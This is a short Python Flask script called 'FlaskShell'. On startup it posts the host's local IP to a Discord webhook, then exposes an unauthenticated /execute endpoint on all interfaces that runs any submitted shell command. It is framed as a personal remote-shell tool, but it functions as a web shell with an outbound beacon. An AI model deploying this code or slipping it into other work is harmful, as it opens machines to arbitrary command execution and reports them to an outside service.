from flask import Flask, render_template, request, jsonify
import subprocess, os, requests

def send_ip_to_discord(webhook_url):
    local_ip = os.popen("hostname -I").read().strip()
    if not local_ip:
        local_ip = os.popen('ipconfig | findstr "IPv4"').read().split(":")[-1].strip()

    requests.post(webhook_url, json={"content": f"FlaskShell is running on your personal network at IP: {local_ip}:5000"})

send_ip_to_discord('WEBHOOK_URL') # REPLACE WEBHOOK_URL WITH YOUR ACTUAL WEBHOOK
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('shell.html')

@app.route('/execute', methods=['POST'])
def execute():
    data = request.json
    command = data.get("command")
    if not command:
        return jsonify({"error": "No command provided"}), 400

    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return jsonify({"result": result})
    except subprocess.CalledProcessError as e:
        return jsonify({"error": e.output}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
